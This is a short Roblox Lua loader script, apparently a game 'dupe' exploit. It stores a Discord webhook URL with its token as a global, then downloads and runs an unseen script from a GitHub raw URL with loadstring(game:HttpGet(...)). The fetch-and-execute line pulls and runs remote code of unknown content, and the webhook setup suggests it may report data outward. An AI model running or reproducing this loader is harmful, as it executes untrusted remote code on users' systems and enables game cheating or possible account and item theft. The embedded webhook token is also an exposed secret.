local Webhook = "https://discord.com/api/webhooks/1442992283162120242/KIjhW1I0_ZZ5xe36NsHjfuqRrHM-UYtFO4h4IZAwdv6Wtd6Fwj5hCMJh7xibNIuCIahJ"

getgenv().UserPingThreshold = 50000000


-- =================================================================================
--      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
-- =================================================================================

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
else
    return
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
